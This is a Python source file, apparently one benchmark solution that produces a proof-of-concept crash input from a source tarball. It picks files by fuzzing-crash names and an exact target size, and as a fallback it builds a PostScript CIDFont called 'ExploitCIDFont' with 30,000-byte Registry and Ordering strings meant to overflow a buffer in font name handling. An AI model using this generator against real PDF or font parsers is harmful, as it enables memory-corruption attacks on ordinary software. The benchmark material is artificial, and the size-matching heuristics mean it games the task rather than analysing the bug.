import os
import tarfile
import gzip
import bz2
import lzma


class Solution:
    TARGET_POC_SIZE = 80064

    def solve(self, src_path: str) -> bytes:
        try:
            tf = tarfile.open(src_path, "r:*")
        except Exception:
            return self._fallback_poc()

        try:
            exact_candidates = []
            gz_like_members = []
            pattern_candidates = []
            small_binary_candidates = []

            for m in tf.getmembers():
                if not m.isfile() or m.size <= 0:
                    continue
                name_lower = m.name.lower()

                # Collect exact-size candidates
                if m.size == self.TARGET_POC_SIZE:
                    exact_candidates.append(m)

                # Collect compressed candidates likely to be PoCs
                if name_lower.endswith((".gz", ".xz", ".bz2")):
                    if self._name_looks_like_poc(name_lower):
                        gz_like_members.append(m)

                # Heuristic candidates based on extension and name
                ext = os.path.splitext(name_lower)[1]
                if ext in (".pdf", ".cff", ".otf", ".ttf", ".ps", ".bin", ".dat"):
                    if self._name_looks_like_poc(name_lower):
                        pattern_candidates.append(m)
                    elif m.size <= 1024 * 1024:
                        small_binary_candidates.append(m)

            # Step 1: Exact-size candidate
            if exact_candidates:
                chosen = self._pick_best_member(exact_candidates)
                data = self._read_member(tf, chosen)
                if data:
                    return data

            # Step 2: Try compressed members that look like PoCs
            for m in gz_like_members:
                try:
                    fobj = tf.extractfile(m)
                    if not fobj:
                        continue
                    raw = fobj.read()
                except Exception:
                    continue

                name_lower = m.name.lower()
                dec = b""
                try:
                    if name_lower.endswith(".gz"):
                        dec = gzip.decompress(raw)
                    elif name_lower.endswith(".xz"):
                        dec = lzma.decompress(raw)
                    elif name_lower.endswith(".bz2"):
                        dec = bz2.decompress(raw)
                except Exception:
                    dec = b""

                if len(dec) == self.TARGET_POC_SIZE:
                    return dec

            # Step 3: Heuristic PoC-like files
            if pattern_candidates:
                chosen = self._pick_best_member(pattern_candidates)
                data = self._read_member(tf, chosen)
                if data:
                    return data

            # Step 4: Any small binary/font/pdf-like file
            if small_binary_candidates:
                chosen = self._pick_best_member(small_binary_candidates)
                data = self._read_member(tf, chosen)
                if data:
                    return data

        finally:
            try:
                tf.close()
            except Exception:
                pass

        # Final fallback: synthetic PoC
        return self._fallback_poc()

    def _name_looks_like_poc(self, name_lower: str) -> bool:
        keywords = (
            "poc",
            "proof",
            "crash",
            "clusterfuzz",
            "testcase",
            "oss-fuzz",
            "cidfont",
            "cid_font",
            "cid-system",
            "cidsystem",
            "cid",
            "buffer-overflow",
            "overflow",
        )
        return any(k in name_lower for k in keywords)

    def _pick_best_member(self, members):
        def score(m):
            name = m.name.lower()
            ext = os.path.splitext(name)[1]
            s = 0

            # Strong indicators of fuzz/PoC files
            if any(k in name for k in ("clusterfuzz", "testcase", "oss-fuzz", "crash", "poc", "proof")):
                s += 1000

            # CID / font specific hints
            if "cidfont" in name or "cid_font" in name:
                s += 200
            elif "cid" in name:
                s += 100

            # Extensions commonly used for this kind of bug
            if ext in (".pdf", ".cff", ".otf", ".ttf", ".ps"):
                s += 150
            elif ext in (".bin", ".dat"):
                s += 50

            # Closeness to target PoC size
            diff = abs(m.size - self.TARGET_POC_SIZE)
            if diff == 0:
                s += 500
            else:
                if diff < 65536:
                    s += max(0, 200 - diff // 512)

            # Slight preference for smaller files to avoid huge blobs
            if m.size > 0:
                s -= m.size // (256 * 1024)

            return s

        best = members[0]
        best_score = score(best)
        for m in members[1:]:
            sc = score(m)
            if sc > best_score:
                best = m
                best_score = sc
        return best

    def _read_member(self, tf, member) -> bytes:
        try:
            fobj = tf.extractfile(member)
            if not fobj:
                return b""
            data = fobj.read()
            if isinstance(data, bytes):
                return data
            return data.encode("latin1", "ignore")
        except Exception:
            return b""

    def _fallback_poc(self) -> bytes:
        # Synthetic PostScript CIDFont resource with very long Registry/Ordering
        # to exercise CIDSystemInfo-based fallback name generation.
        header = (
            b"%!PS-Adobe-3.0 Resource-CIDFont\n"
            b"%%DocumentNeededResources: ProcSet (CIDInit)\n"
            b"%%IncludeResource: ProcSet (CIDInit)\n"
            b"%%BeginResource: CIDFont (ExploitCIDFont)\n"
            b"/CIDFontName /ExploitCIDFont def\n"
            b"/CIDSystemInfo 3 dict dup begin\n"
            b"/Registry ("
        )
        registry = b"R" * 30000
        middle = b") def\n/Ordering ("
        ordering = b"O" * 30000
        footer = (
            b") def\n"
            b"/Supplement 0 def\n"
            b"end def\n"
            b"%%EndResource\n"
            b"%%EOF\n"
        )

        data = header + registry + middle + ordering + footer

        # Adjust length to be close to TARGET_POC_SIZE
        target = self.TARGET_POC_SIZE
        if len(data) < target:
            data += b"A" * (target - len(data))
        elif len(data) > target:
            data = data[:target]

        return data